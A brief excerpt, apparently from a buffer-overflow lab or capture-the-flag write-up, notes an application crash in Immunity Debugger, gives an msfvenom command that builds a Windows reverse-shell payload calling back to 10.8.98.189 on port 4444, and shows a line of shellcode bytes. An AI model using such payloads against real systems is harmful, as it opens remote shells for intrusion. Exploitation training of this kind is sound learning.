...
We execute this and we see that the application crashes, and in Immunity Debugger we see:
...
`msfvenom -p windows/shell_reverse_tcp LHOST=10.8.98.189 LPORT=4444 EXITFUNC=thread -b "\x00\xa0\xcd\xd4" -a x86 -f c`
...
"\x79\x82\x47\x88\x29\x2c\x38\x69\x99\x8c\xe8\x01\xf3\x02\xd6"
